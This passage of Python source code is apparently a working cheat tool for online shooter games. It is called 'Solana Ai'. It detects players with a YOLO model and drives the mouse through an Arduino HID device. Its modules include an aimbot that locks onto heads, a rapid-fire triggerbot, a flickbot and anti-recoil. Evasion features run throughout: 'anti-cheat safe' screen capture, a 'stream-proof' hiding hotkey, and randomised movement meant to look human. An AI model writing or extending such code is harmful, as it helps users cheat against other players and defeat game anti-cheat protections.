            print("[+] HID mouse initialized")
            return True
        except Exception as e:
            print(f"[-] Error initializing HID mouse: {e}")
            return False

    def start_overlay(self):
        """Start the overlay system"""
        if self.overlay_initialized or not self.show_overlay:
            return
        
        try:
            #print(f"[+] Starting {self.overlay_shape} overlay...")
            
            # Create new overlay instance to ensure clean state
            self.overlay = Overlay(self.overlay_cfg)
            
            # Ensure overlay has the correct shape before starting
            self.overlay.set_shape(self.overlay_shape)
            
            # Get dimensions based on overlay shape
            width, height = self.get_overlay_dimensions()
            
            self.overlay.show(width, height)
            self.overlay_initialized = True
            #print(f"[+] {self.overlay_shape.capitalize()} overlay started successfully")
        except Exception as e:
            print(f"[-] Error starting overlay: {e}")
            self.overlay_initialized = False

    def toggle_overlay_shape(self):
        """Toggle between circle and square overlay shapes"""
        new_shape = "square" if self.overlay_shape == "circle" else "circle"
        self.config_manager.set_overlay_shape(new_shape)
        print(f"[+] Overlay shape toggled to: {new_shape}")

    def stop_overlay(self):
        """Stop the overlay system"""
        if not self.overlay_initialized:
            return
        
        try:
            #print("[+] Stopping overlay...")
            self.overlay_initialized = False  # Set this first to prevent any new operations
            
            if self.overlay:
                self.overlay.stop()
                # Give it time to properly clean up
                time.sleep(0.1)
                
            #print("[+] Overlay stopped successfully")
        except Exception as e:
            print(f"[-] Error stopping overlay: {e}")
        finally:
            # Always mark as not initialized
            self.overlay_initialized = False
    
    def start(self):
        """Start the SolanaAi"""
        if self.running:
            print("[!] Solana Ai is already running!")
            return False
        
        self.running = True
        self.should_exit = False

        # Start controller if enabled
        if self.controller_enabled:
            self.controller.enabled = True
            self.controller.start()
        
        # Start overlay if enabled
        if self.show_overlay:
            self.start_overlay()

        # Start debug window if enabled
        if self.visuals_enabled:
            self.start_debug_window()

        # Start anti-recoil if enabled and using HID
        if self.anti_recoil.enabled and self.mouse_method.lower() == "hid":
            self.anti_recoil.start()

        self.thread = threading.Thread(target=self.run_loop, daemon=True)
        self.thread.start()

        window_status = []
        if self.show_overlay:
            window_status.append(f"{self.overlay_shape} overlay")
        if self.visuals_enabled:
            window_status.append("debug window")
        if self.use_movement_curves:
            window_status.append(f"{self.movement_curve_type} curves")
        
        status_text = " and ".join(window_status) if window_status else "no visual components"
        #print(f"[+] Solana AI started with {status_text}")
        return True
    
    def stop(self):
        """Stop the Solana Ai"""
        if not self.running:
            print("[!] Solana Ai is not running!")
            return
        
        print("[+] Stopping Solana Ai...")
        self.running = False
        self.should_exit = True  # Set exit flag

        # Stop controller
        if self.controller:
            self.controller.stop()

        # Stop anti-recoil
        self.anti_recoil.stop()

        # Stop visual components
        self.stop_debug_window()

        # Stop overlay
        self.stop_overlay()
        
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=3)  # Increased timeout
            if self.thread.is_alive():
                print("[!] Warning: Solana Ai thread did not stop cleanly")
        
        # Clean up resources
        self.cleanup_resources()
        
        print("[+] Solana Ai stopped successfully")

    def cleanup_resources(self):
        """Clean up all resources"""
        if self.camera:
            try:
                self.camera.release()
                self.camera = None
            except Exception as e:
                print(f"[-] Error releasing camera: {e}")
        
        if self.model:
            try:
                # Clear model from memory if possible
                self.model = None
            except Exception as e:
                print(f"[-] Error clearing model: {e}")
        
        if self.smoother:
            self.smoother = None

    def force_stop(self):
        """Force stop everything - for emergency shutdown"""
        print("[!] Force stopping Solana Ai...")
        self.should_exit = True
        self.running = False
        self.stop_overlay()
        self.stop_debug_window()
        self.cleanup_resources()
        
        # Force terminate thread if it's still running
        if self.thread and self.thread.is_alive():
            print("[!] Force terminating Solana Ai thread...")
            # Note: There's no safe way to force kill a thread in Python
            # The thread should respect the should_exit flag

    def filter_detections(results, ignore_classes):
        """
        Returns a filtered list of boxes, removing any whose class name is in ignore_classes.
        """
        filtered_boxes = []
        for box in results[0].boxes:
            cls_id = int(box.cls[0])
            cls_name = results[0].names[cls_id]
            if cls_name not in ignore_classes:
                filtered_boxes.append(box)
        results[0].boxes = filtered_boxes
        return results


    def filter_and_prioritize(self, results):
        IGNORE_CLASSES = {"weapon", "dead_body", "smoke", "fire"}
        OPTIONAL_CLASSES = {"outline", "hideout_target_human", "hideout_target_balls", "third_person"}
        FOCUS_OPTIONAL = False

        boxes = results[0].boxes
        keep_indices = []

        for idx, box in enumerate(boxes):
            cls_id = int(box.cls[0])
            cls_name = results[0].names[cls_id]

            if cls_name in IGNORE_CLASSES:
                continue
            if cls_name in OPTIONAL_CLASSES and not FOCUS_OPTIONAL:
                continue

            keep_indices.append(idx)

        # Keep only selected boxes (preserves Boxes type)
        results[0].boxes = boxes[keep_indices]
        return results

    def run_loop(self):
        """Main Solana loop"""
        try:
            if not authenticate():
                print("[-] Authentication failed")
                return

            self.initialize_components()

            if not hasattr(self, 'target_tracker'):
                self.initialize_target_tracker()

            current_x, current_y = 0, 0
            
            if self.keybind == "0x02":
                print(colored(f"Solana Ai is running. Hold right click to lock.", 'green'))
            else:
                print(colored(f"Solana Ai is running. Hold your keybind to lock.", 'green'))
            
            while self.running:
                try:
                    # ==================== TRIGGERBOT ====================
                    if self.triggerbot.enabled and self.triggerbot.is_keybind_pressed():
                        if self.camera and self.model:
                            trigger_frame = self.camera.grab()
                            if trigger_frame is not None:
                                trigger_results = self.model.predict(trigger_frame, conf=self.confidence, iou=0.1, verbose=False)
                                trigger_results = self.filter_and_prioritize(trigger_results)
                                if self.triggerbot.perform_trigger_with_results(trigger_results):
                                    pass
                    # ==================== END TRIGGERBOT ====================

                    # ==================== FLICKBOT ====================
                    if self.flickbot.enabled and self.flickbot.is_keybind_pressed():
                        if self.camera and self.model:
                            flick_frame = self.camera.grab()
                            if flick_frame is not None:
                                flick_results = self.model.predict(flick_frame, conf=self.confidence, iou=0.1, verbose=False)
                                flick_results = self.filter_and_prioritize(flick_results)
                                if self.flickbot.perform_flick_with_results(flick_results):
                                    time.sleep(0.001)
                                    continue
                    # ==================== END FLICKBOT ====================
                
                    # Debug/live feed window
                    if self.visuals and self.visuals.running and self.camera:
                        frame = self.camera.grab()
                        if frame is not None:
                            self.visuals.update_frame(frame)
                
                    # Main aim-assist path
                    if win32api.GetKeyState(int(self.keybind, 16)) in (-127, -128):
                        frame = self.camera.grab()
                        if frame is not None:
                            results = self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)
                            results = self.filter_and_prioritize(results)
                            self.process_frame(current_x, current_y, results)
                    else:
                        time.sleep(0.001)
                
                except Exception as e:
                    print(f"[-] Error in Solana loop: {e}")
                    time.sleep(0.1)
        
        except Exception as e:
            print(f"[-] Fatal error in Solana Ai: {e}")
        finally:
            self.running = False

    
    def update_overlay_only(self):
        """Update overlay visuals without targeting"""
        if not self.overlay_initialized:
            return
        
        try:
            # Draw crosshair
            center = self.fov // 2
            if self.overlay_shape == "circle":
                self.overlay.draw_line(center-5, center, center+5, center, '#c8a2c8', 2)
                self.overlay.draw_line(center, center-5, center, center+5, '#c8a2c8', 2)
                self.overlay.draw_oval(center-2, center-2, center+2, center+2, '#c8a2c8', 1)
            else:  # square
                self.overlay.draw_line(center-5, center, center+5, center, '#c8a2c8', 2)
                self.overlay.draw_line(center, center-5, center, center+5, '#c8a2c8', 2)
                self.overlay.draw_square(center-2, center-2, center+2, center+2, '#c8a2c8', 1)
            
            # Optionally show detection boxes on overlay (without aiming)
            detected_objects = self.detect_objects_in_fov()
            for obj in detected_objects:
                x1, y1, x2, y2 = obj['bbox']
                confidence = obj['confidence']
                
                if confidence > self.confidence:
                    # Draw segmented corners (visual only)
                    box_width = x2 - x1
                    box_height = y2 - y1
                    corner_size = min(max(20, box_width // 3), max(20, box_height // 3))
                    line_thickness = 2
                    
                    # Draw segmented corners
                    self.overlay.draw_line(x1, y1, x1 + corner_size, y1, 'white', line_thickness)
                    self.overlay.draw_line(x1, y1, x1, y1 + corner_size, 'white', line_thickness)
                    self.overlay.draw_line(x2 - corner_size, y1, x2, y1, 'white', line_thickness)
                    self.overlay.draw_line(x2, y1, x2, y1 + corner_size, 'white', line_thickness)
                    self.overlay.draw_line(x1, y2 - corner_size, x1, y2, 'white', line_thickness)
                    self.overlay.draw_line(x1, y2, x1 + corner_size, y2, 'white', line_thickness)
                    self.overlay.draw_line(x2, y2 - corner_size, x2, y2, 'white', line_thickness)
                    self.overlay.draw_line(x2 - corner_size, y2, x2, y2, 'white', line_thickness)
                    
        except Exception as e:
            pass  # Silently handle overlay errors

    def process_frame_for_aiming(self, current_x, current_y):
        """Process frame for actual aiming - only when keybind is pressed"""
        if not self.camera or not self.model:
            return
        
        try:
            frame = self.camera.grab()
            if frame is None:
                return
            
            # Update debug window (same frame used for aiming)
            if self.visuals and self.visuals.running:
                self.visuals.update_frame(frame)
            
            # Update overlay visuals
            self.update_overlay_only()
            
            # ACTUAL AIMING LOGIC - ONLY RUNS WHEN KEYBIND PRESSED
            results = self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)
            
            # Find closest target
            closest = self.find_closest_target(results)
            if closest:
                self.aim_at_target(closest, current_x, current_y)
                
        except Exception as e:
            print(f"[-] Error processing frame for aiming: {e}")
    
    def initialize_components(self):
        """Initialize Solana components with model selection"""
        try:
            # Initialize Kalman smoother with config manager
            self.smoother = KalmanSmoother(self.config_manager)
        
            # Only initialize model if it hasn't been loaded yet
            if self.model is None:
                # Get model path from config manager
                model_path = self.config_manager.get_model_for_loading()
            
                if not model_path:
                    raise Exception("No models found in directory")
            
                # Load the selected model
                print(f"[+] Loading model: {model_path}")
                self.model = YOLO(model_path, task="detect", verbose=False)
            
                # Update config with loaded model path
                self.config_manager.set_value("model.model_path", model_path)
            
                # Get model-specific overrides
                confidence_override = self.config_manager.get_model_specific_confidence()
                if confidence_override is not None:
                    self.confidence = confidence_override
            
                iou_override = self.config_manager.get_model_specific_iou()
                if iou_override is not None:
                    self.iou = iou_override
        
            # Initialize anti-cheat safe camera
            left = (self.full_x - self.fov) // 2
            top = (self.full_y - self.fov) // 2
        
            self.camera = StealthCapture(fov=self.fov, left=left, top=top)
            print("[+] Anti-cheat safe capture started")
        
            # Initialize mouse if using HID
            if self.mouse_method.lower() == "hid":
                self.initialize_mouse()
        
            # Warm up the model
            frame = self.camera.grab()
            if frame is not None:
                self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)
        
            print(f"[+] All components initialized successfully")
        
        except Exception as e:
            print(f"[-] Error initializing components: {e}")
            raise
    
    def process_frame(self, current_x, current_y, results):
        """Process a single frame for Solana - Enhanced with debug window and controller integration"""
        if not self.camera or not self.model:
            return
    
        try:
            frame = self.camera.grab()
            if frame is None:
                return
        
            # Update debug window with frame (this will calculate and display FPS)
            if self.visuals and self.visuals.running:
                self.visuals.update_frame(frame)
        
            # Check if overlay is still initialized and running
            if self.overlay_initialized and self.overlay and self.overlay.running:
                try:
                    # Draw crosshair
                    center = self.fov // 2
                    if self.overlay_shape == "circle":
                        self.overlay.draw_line(center-5, center, center+5, center, '#c8a2c8', 2)
                        self.overlay.draw_line(center, center-5, center, center+5, '#c8a2c8', 2)
                        self.overlay.draw_oval(center-2, center-2, center+2, center+2, '#c8a2c8', 1)
                    else:  # square
                        self.overlay.draw_line(center-5, center, center+5, center, '#c8a2c8', 2)
                        self.overlay.draw_line(center, center-5, center, center+5, '#c8a2c8', 2)
                        self.overlay.draw_square(center-2, center-2, center+2, center+2, '#c8a2c8', 1)
                
                    # Get and draw YOLO detections
                    detected_objects = self.detect_objects_in_fov()
                
                    # Draw detection boxes for all detected objects
                    for obj in detected_objects:
                        x1, y1, x2, y2 = obj['bbox']
                        confidence = obj['confidence']
                    
                        if confidence > self.confidence:
                            # Add segmented square design
                            box_width = x2 - x1
                            box_height = y2 - y1
                            corner_size = min(max(20, box_width // 3), max(20, box_height // 3))
                            line_thickness = 2
                        
                            # Draw segmented corners
                            self.overlay.draw_line(x1, y1, x1 + corner_size, y1, 'white', line_thickness)
                            self.overlay.draw_line(x1, y1, x1, y1 + corner_size, 'white', line_thickness)
                            self.overlay.draw_line(x2 - corner_size, y1, x2, y1, 'white', line_thickness)
                            self.overlay.draw_line(x2, y1, x2, y1 + corner_size, 'white', line_thickness)
                            self.overlay.draw_line(x1, y2 - corner_size, x1, y2, 'white', line_thickness)
                            self.overlay.draw_line(x1, y2, x1 + corner_size, y2, 'white', line_thickness)
                            self.overlay.draw_line(x2, y2 - corner_size, x2, y2, 'white', line_thickness)
                            self.overlay.draw_line(x2 - corner_size, y2, x2, y2, 'white', line_thickness)
                except Exception as e:
                    # Overlay error - don't crash the whole process
                    print(f"[-] Error updating overlay visuals: {e}")
        
            # Use current confidence setting
            # results = self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)

            # Find target with locking logic
            closest = self.find_closest_target_with_lock(results)
        
            # Find closest target
            #closest = self.find_closest_target(results)
            if closest:
                self.has_target = True
                self.last_target_time = time.time()
        
                # Convert to float values if they're tensors
                target_x = closest[0].item() if hasattr(closest[0], 'item') else closest[0]
                target_y = closest[1].item() if hasattr(closest[1], 'item') else closest[1]
        
                # Get target absolute position
                left = (self.full_x - self.fov) // 2
                top = (self.full_y - self.fov) // 2
                absolute_x = target_x + left
                absolute_y = target_y + top
              
                # ==================== CONTROLLER INTEGRATION ====================
                # Check activation from BOTH keyboard AND controller
                keybind_active = win32api.GetKeyState(int(self.keybind, 16)) in (-127, -128)
                controller_active = False
            
                # Check controller activation if enabled
                if hasattr(self, 'controller') and self.controller and self.controller.enabled:
                    if self.controller.controller:  # Controller is connected
                        controller_active = self.controller.is_aiming
                    
                        # Vibrate on first target acquisition (only once per target)
                        if controller_active and not hasattr(self, '_vibrated_for_target'):
                            self._vibrated_for_target = True
                            if self.config_manager.get_value('controller.vibration', True):
                                self.controller.vibrate(0.2, 0.2, 0.05)  # Light vibration
                    
                        # Manual stick adjustment while aiming
                        if controller_active:
                            stick_x, stick_y = self.controller.get_stick_input(self.controller.aim_stick)
                            if abs(stick_x) > 0.1 or abs(stick_y) > 0.1:
                                # Apply manual adjustment on top of aimbot
                                manual_x = stick_x * 10 * self.controller.sensitivity_multiplier
                                manual_y = stick_y * 10 * self.controller.sensitivity_multiplier
                            
                                if self.mouse_method.lower() == "hid":
                                    move_mouse(int(manual_x), int(manual_y))
            
                # Normal aimbot - activate if EITHER keybind OR controller is active
                if keybind_active or controller_active:
                    self.aim_at_target(closest, current_x, current_y)
                # ==================== END CONTROLLER INTEGRATION ====================
            else:
                # No target found
                if time.time() - self.last_target_time > 0.5:
                    self.has_target = False
                    self._vibrated_for_target = False  # Reset vibration flag
            
        except Exception as e:
            print(f"[-] Error processing frame: {e}")

    def detect_objects_in_fov(self):
        """Detect objects using the existing YOLO model"""
        detected_objects = []
        
        if not self.camera or not self.model:
            return detected_objects
        
        try:
            # Use the same frame capture as the main detection
            frame = self.camera.grab()
            if frame is None:
                return detected_objects
            
            # Run YOLO prediction with current settings
            results = self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)
            
            # Convert YOLO results to detection format
            for box in results[0].boxes:
                x1, y1, x2, y2 = box.xyxy[0].cpu().numpy()
                confidence = box.conf[0].cpu().numpy()
                
                detected_objects.append({
                    'bbox': (int(x1), int(y1), int(x2), int(y2)),
                    'confidence': float(confidence),
                    'class': 'target'  # You can get actual class names if needed
                })
                
        except Exception as e:
            print(f"[-] Error in YOLO detection: {e}")
        
        return detected_objects
    
    def find_closest_target(self, results):
        """Find the closest target using current settings"""
        closest = None
        least_dist = float('inf')
        fov_half = self.fov // 2
        
        for box in results[0].boxes:
            x1, y1, x2, y2 = box.xyxy[0]

            # Convert tensors to float if needed
            if hasattr(x1, 'item'):
                x1, y1, x2, y2 = x1.item(), y1.item(), x2.item(), y2.item()

            height = y2 - y1
            width = x2 - x1
            head_x = (x1 + x2) / 2
            head_y = y1 + (height * (100 - self.aim_height) / 100)
            
            if head_x < 0 or head_x > self.fov or head_y < 0 or head_y > self.fov:
                continue

            # Skip only very tiny detections (noise)
            if width < 5 or height < 5:
                continue
            
            dist = (head_x - fov_half) ** 2 + (head_y - fov_half) ** 2
            if dist < least_dist:
                least_dist = dist
                closest = (head_x, head_y)
        
        return closest
    
    def aim_at_target(self, target, current_x, current_y):
        try:
            # 1) raw movement (already in mouse units)
            move_x, move_y = self.calc_movement(target[0], target[1])

            # 2) Kalman on raw movement (now it actually matters)
            if self.use_kalman:
                move_x, move_y = self.smoother.update(move_x, move_y)

            # 3) Curves/humanization AFTER Kalman (optional)
            if self.use_movement_curves:
                distance = math.sqrt(move_x**2 + move_y**2)
                if distance > 2:
                    curve_mod = self.get_fast_curve_modifier(distance)
                    move_x *= curve_mod
                    move_y *= curve_mod
                    if self.random_curves and random.random() < 0.2:
                        move_x += random.uniform(-0.5, 0.5)
                        move_y += random.uniform(-0.5, 0.5)

            # 4) Clamp and send once
            clamped_dx = max(-127, min(127, int(round(move_x))))
            clamped_dy = max(-127, min(127, int(round(move_y))))

            with self.mouse_lock:
                if self.mouse_method.lower() == "hid" and ensure_mouse_connected():
                    move_mouse(clamped_dx, clamped_dy)

            # 5) bookkeeping (keep float accumulators)
            current_x += move_x
            current_y += move_y
            self.current_mouse_position = (float(current_x), float(current_y))

        except Exception as e:
            print(f"[-] Error aiming at target: {e}")


    def get_fast_curve_modifier(self, distance):
        """Get a fast curve modifier based on distance and curve type"""
        # Normalize distance (smaller values = less modification = faster)
        t = min(1.0, distance / 100.0)
    
        if self.movement_curve_type == "Bezier":
            # Fast bezier - minimal curve
            if t < 0.5:
                return 0.9 + (0.1 * (2 * t * t))
            else:
                return 0.9 + (0.1 * (-1 + (4 - 2 * t) * t))
            
        elif self.movement_curve_type == "Sine":
            # Fast sine - subtle wave
            return 0.95 + 0.05 * math.sin(t * math.pi)
        
        elif self.movement_curve_type == "Exponential":
            # Fast exponential - quick ramp
            return 0.9 + 0.1 * (1 - math.exp(-3 * t))
        
        elif self.movement_curve_type == "Catmull":
            # Fast catmull - minimal smoothing
            return 0.95 + 0.05 * t
        
        elif self.movement_curve_type == "Hermite":
            # Fast hermite - quick ease
            return 0.9 + 0.1 * (3 * t * t - 2 * t * t * t)
        
        elif self.movement_curve_type == "B-Spline":
            # Fast b-spline - minimal curve
            return 0.95 + 0.05 * t * t
        
        return 1.0  # No modification


    def execute_curve_movement_improved(self, path):
        """Execute the curved movement path with better timing"""
        if len(path) < 2 or self.mouse_method.lower() != "hid":
            return
    
        try:
            # Calculate total distance for timing
            total_distance = 0
            for i in range(1, len(path)):
                dx = path[i][0] - path[i-1][0]
                dy = path[i][1] - path[i-1][1]
                total_distance += math.sqrt(dx*dx + dy*dy)
        
            # Base movement time (in seconds) - adjust based on distance
            base_time = min(0.05, total_distance / 1000.0)  # Cap at 50ms total
            time_per_step = base_time / len(path) / self.movement_speed
        
            # Track cumulative movement
            cumulative_x = 0.0
            cumulative_y = 0.0
        
            for i in range(1, len(path)):
                if not self.running:  # Stop if aimbot is stopped
                    break
            
                # Calculate desired movement
                desired_x = path[i][0]
                desired_y = path[i][1]
            
                # Calculate actual movement needed (accounting for rounding errors)
                move_x = desired_x - cumulative_x
                move_y = desired_y - cumulative_y

                # CLAMP BEFORE ROUNDING
                clamped_move_x = max(-127, min(127, move_x))
                clamped_move_y = max(-127, min(127, move_y))
            
                # Round and move
                int_move_x = int(round(clamped_move_x))
                int_move_y = int(round(clamped_move_y))
            
                # Skip tiny movements
                if abs(int_move_x) > 0 or abs(int_move_y) > 0:
                    move_mouse(int_move_x, int_move_y)
                
                    # Update cumulative position
                    cumulative_x += int_move_x
                    cumulative_y += int_move_y
            
                # Small delay for smooth movement
                if time_per_step > 0:
                    time.sleep(time_per_step)
                
        except Exception as e:
            print(f"[-] Error executing curve movement: {e}")

    def toggle_debug_window(self):
        """Toggle debug window on/off during runtime"""
        if self.visuals_enabled:
            self.visuals_enabled = False
            self.stop_debug_window()
            print("[+] Debug window disabled")
        else:
            self.visuals_enabled = True
            self.start_debug_window()
            print("[+] Debug window enabled")
        
        # Update config
        self.config_manager.set_value('show_debug_window', self.visuals_enabled)

    def get_debug_fps(self):
        """Get current FPS from debug window"""
        # Since FPS is calculated in the debug window, we can't easily retrieve it
        # This is a placeholder for future implementation
        return 0

    def get_status_info(self):
        """Get current status information including overlay shape"""
        model_info = self.get_current_model_info()

        return {
            "running": self.running,
            "overlay_active": self.overlay_initialized,
            "debug_window_active": self.visuals_enabled and self.visuals and self.visuals.running,
            "overlay_shape": self.overlay_shape,
            "fov": self.fov,
            "sensitivity": self.sensitivity,
            "kalman_enabled": self.use_kalman,
            "movement_curves_enabled": self.use_movement_curves,
            "current_curve_type": self.movement_curve_type,
            "supported_curves": self.get_supported_curves(),
            "model_loaded": model_info["loaded"],
            "model_name": model_info["name"],
            "model_confidence": model_info["confidence"]
        }

mouse_dev = None

class SmartArduinoAntiRecoil:
    """Smart anti-recoil with rate limiting to prevent Arduino crashes"""
    
    def __init__(self, aimbot_controller):
        self.aimbot_controller = aimbot_controller
        self.enabled = False
        self.strength = 5.0
        self.reduce_bloom = True
        self.running = False
        self.thread = None
        
        # Smart activation flags
        self.require_target = True
        self.require_keybind = True
        
        # Rate limiting to prevent Arduino crashes
        self.last_recoil_time = 0
        self.min_recoil_interval = 0.008  # Minimum 8ms between commands (125Hz max)
        self.recoil_active = False
        
        # Add mutex for thread safety
        self.recoil_lock = threading.Lock()
    
    def start(self):
        """Start anti-recoil system"""
        if not self.running:
            self.running = True
            
            # Start recoil compensation thread
            self.thread = threading.Thread(target=self.recoil_loop, daemon=True)
            self.thread.start()
            
            #print("[+] Smart Arduino Anti-recoil started - only activates when aiming at targets")
            return True
        return False
    
    def stop(self):
        """Stop anti-recoil system"""
        self.running = False
        
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1)
            
        print("[+] Anti-recoil stopped")
    
    def check_mouse_button(self):
        """Check if left mouse button is pressed using Windows API"""
        # VK_LBUTTON = 0x01 for left mouse button
        state = win32api.GetAsyncKeyState(0x01)
        # If high bit is set, button is pressed
        return state & 0x8000 != 0
    
    def should_activate(self):
        """Check if anti-recoil should activate"""
        if not self.enabled:
            return False
        
        # Check mouse button state using Windows API
        is_firing = self.check_mouse_button()
        
        if not is_firing:
            return False
        
        # Check if aimbot is running
        if not self.aimbot_controller.running:
            return False
        
        # Check if keybind is required and pressed
        if self.require_keybind:
            try:
                keybind_state = win32api.GetKeyState(int(self.aimbot_controller.keybind, 16))
                if keybind_state not in (-127, -128):
                    return False
            except:
                return False
        
        # Check if target is required and detected
        if self.require_target:
            if hasattr(self.aimbot_controller, 'has_target'):
                return self.aimbot_controller.has_target
            return False
        
        return True
    
    def recoil_loop(self):
        """Main anti-recoil loop with rate limiting"""
        consecutive_errors = 0
        
        while self.running:
            try:
                current_time = time.time()
                
                # Rate limiting check
                time_since_last = current_time - self.last_recoil_time
                if time_since_last < self.min_recoil_interval:
                    time.sleep(self.min_recoil_interval - time_since_last)
                    continue
                
                if self.should_activate():
                    with self.recoil_lock:
                        # Check if mouse device is healthy
                        if not ensure_mouse_connected():
                            consecutive_errors += 1
                            if consecutive_errors > 5:
                                print("[-] Anti-recoil disabled due to device errors")
                                self.enabled = False
                                break
                            time.sleep(0.1)
                            continue
                        
                        # Reset error counter on successful connection
                        consecutive_errors = 0
                        
                        # Apply recoil compensation with smaller, smoother movements
                        vertical_offset = self.calculate_vertical_offset()
                        horizontal_offset = self.calculate_horizontal_offset()
                        
                        # Clamp values to prevent Arduino overflow
                        vertical_offset = max(-10, min(10, vertical_offset))
                        horizontal_offset = max(-5, min(5, horizontal_offset))
                        
                        if abs(vertical_offset) > 0.5 or abs(horizontal_offset) > 0.5:
                            # Use existing move_mouse with rate limiting
                            move_mouse(int(horizontal_offset), int(vertical_offset))
                            self.last_recoil_time = current_time
                        
                    # Variable delay based on fire rate
                    time.sleep(random.uniform(0.010, 0.020))  # 10-20ms
                else:
                    # Not active, idle with lower CPU usage
                    self.recoil_active = False
                    time.sleep(0.05)  # 50ms idle check
                    
            except Exception as e:
                print(f"[-] Anti-recoil error: {e}")
                consecutive_errors += 1
                if consecutive_errors > 10:
                    self.enabled = False
                    break
                time.sleep(0.1)
    
    def calculate_vertical_offset(self):
        """Calculate smoother vertical recoil compensation"""
        # Use smoother, smaller values
        base_strength = self.strength * 0.7  # Reduce base strength
        
        # Add slight randomization for more natural movement
        variation = random.uniform(0.8, 1.2)
        vertical_offset = base_strength * variation
        
        # Apply smoothing if target is locked
        if hasattr(self.aimbot_controller, 'target_lock'):
            if self.aimbot_controller.target_lock.get('current_target_id'):
                vertical_offset *= 0.8  # Reduce when locked on target
        
        return vertical_offset
    
    def calculate_horizontal_offset(self):
        """Calculate horizontal bloom compensation"""
        if not self.reduce_bloom:
            return 0
        
        # Small random horizontal movement to counter bloom
        horizontal_offset = random.randrange(-2000, 2000, 1) / 1000.0
        return horizontal_offset
    
    def set_strength(self, strength):
        """Set anti-recoil strength (0-20 recommended)"""
        self.strength = max(0, min(50, strength))
        print(f"[+] Anti-recoil strength set to: {self.strength}")
    
    def set_enabled(self, enabled):
        """Enable/disable anti-recoil"""
        self.enabled = enabled
        if enabled:
            print(f"[+] Anti-recoil enabled with strength: {self.strength}")
        else:
            print("[+] Anti-recoil disabled")

from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

class ModelReloadThread(QThread):
    """Thread for reloading the model without blocking UI"""
    finished = pyqtSignal(bool, str)  # success, message
    progress = pyqtSignal(str)  # progress updates
    
    def __init__(self, aimbot_controller, parent=None):
        super().__init__(parent)
        self.aimbot_controller = aimbot_controller
        
    def run(self):
        try:
            self.progress.emit("Stopping aimbot if running...")
            
            # Call the reload_model method which handles everything
            success = self.aimbot_controller.reload_model()
            
            if success:
                model_info = self.aimbot_controller.get_current_model_info()
                self.finished.emit(True, f"Model loaded: {model_info['name']}")
            else:
                self.finished.emit(False, "Failed to reload model")
                
        except Exception as e:
            self.finished.emit(False, f"Error: {str(e)}")

class HotkeyHandler:
    """Separate class to handle hotkeys properly"""
    def __init__(self, config_app):
        self.config_app = config_app
        self.running = True
        self.last_menu_key = 0x76  # F7
        self.last_stream_key = 0x75  # F6
        self.menu_key_pressed = False
        self.stream_key_pressed = False
        
    def check_hotkeys(self):
        """Check for hotkey presses"""
        try:
            # Get current hotkey configuration
            current_config = self.config_app.config_manager.get_config()
            hotkey_config = current_config.get("hotkeys", {})
            
            # Parse menu toggle key
            menu_key_str = hotkey_config.get("menu_toggle_key", "0x76")
            try:
                menu_key = int(menu_key_str, 16) if isinstance(menu_key_str, str) else menu_key_str
            except:
                menu_key = 0x76
                
            # Parse stream-proof key
            stream_key_str = hotkey_config.get("stream_proof_key", "0x75")
            try:
                stream_key = int(stream_key_str, 16) if isinstance(stream_key_str, str) else stream_key_str
            except:
                stream_key = 0x75
            
            # Check menu toggle key
            menu_state = win32api.GetAsyncKeyState(menu_key) & 0x8000
            if menu_state and not self.menu_key_pressed:
                self.menu_key_pressed = True
                QTimer.singleShot(0, self.config_app.toggle_visibility)
            elif not menu_state:
                self.menu_key_pressed = False
                
            # Check stream-proof key
            stream_state = win32api.GetAsyncKeyState(stream_key) & 0x8000
            if stream_state and not self.stream_key_pressed:
                self.stream_key_pressed = True
                QTimer.singleShot(0, self.config_app.toggle_stream_proof)
            elif not stream_state:
                self.stream_key_pressed = False
                
        except Exception as e:
            print(f"Hotkey check error: {e}")

class Triggerbot:
    """Automatic firing when crosshair is on target - FAST SPRAY VERSION"""
    
    def __init__(self, aimbot_controller):
        self.aimbot_controller = aimbot_controller
        self.enabled = False
        self.confidence_threshold = 0.5
        self.fire_delay = 0.001  # Minimal initial delay (1ms)
        self.cooldown = 0.001   # Minimal cooldown between shots (1ms) 
        self.last_fire_time = 0
        self.require_aimbot_key = False
        self.keybind = 0x02
        self.running = False
        self.consecutive_failures = 0
        self.rapid_fire = True
        self.shots_per_burst = 1
        self.trigger_in_progress = False
        
        # New spray mode settings
        self.spray_mode = True  # Enable continuous spray
        self.spray_active = False  # Track if currently spraying
        self.spray_start_time = 0  # Track when spray started
        self.max_spray_duration = 5.0  # Max continuous spray time (seconds)
        self.spray_rate = 0.001  # Time between shots when spraying (1ms = very fast)
    
    def is_keybind_pressed(self):
        """Check if triggerbot keybind is pressed"""
        return win32api.GetAsyncKeyState(self.keybind) < 0
    
    def is_ready_to_fire(self):
        """Check if triggerbot is ready to fire - ALWAYS READY IN SPRAY MODE"""
        if self.spray_mode and self.spray_active:
            # In spray mode, check spray rate instead of cooldown
            return time.time() - self.last_fire_time >= self.spray_rate
        return time.time() - self.last_fire_time > self.cooldown and not self.trigger_in_progress
    
    def find_best_target_from_results(self, results):
        """Find best target from YOLO results for triggerbot"""
        if not results or len(results[0].boxes) == 0:
            return None
        
        targets = []
        fov_center = self.aimbot_controller.fov // 2
        
        for box in results[0].boxes:
            x1, y1, x2, y2 = box.xyxy[0]
            
            # Convert tensors if needed
            if hasattr(x1, 'item'):
                x1, y1, x2, y2 = x1.item(), y1.item(), x2.item(), y2.item()
            
            # Calculate dimensions
            height = y2 - y1
            width = x2 - x1
            
            # Skip tiny detections
            if width < 5 or height < 5:
                continue
            
            # Use the SAME aim calculation as main aimbot
            center_x = (x1 + x2) / 2
            target_y = y1 + (height * (100 - self.aimbot_controller.aim_height) / 100)
            
            # Calculate distance from center
            dist_from_center = math.sqrt((center_x - fov_center) ** 2 + (target_y - fov_center) ** 2)
            
            # Get confidence
            confidence = box.conf[0].cpu().numpy() if hasattr(box.conf[0], 'cpu') else box.conf[0]
            
            # Only add if confidence meets threshold
            if confidence >= self.confidence_threshold:
                targets.append({
                    'position': (center_x, target_y),
                    'distance': dist_from_center,
                    'confidence': confidence,
                    'box': (x1, y1, x2, y2)
                })
        
        if not targets:
            return None
        
        # Return closest target to center
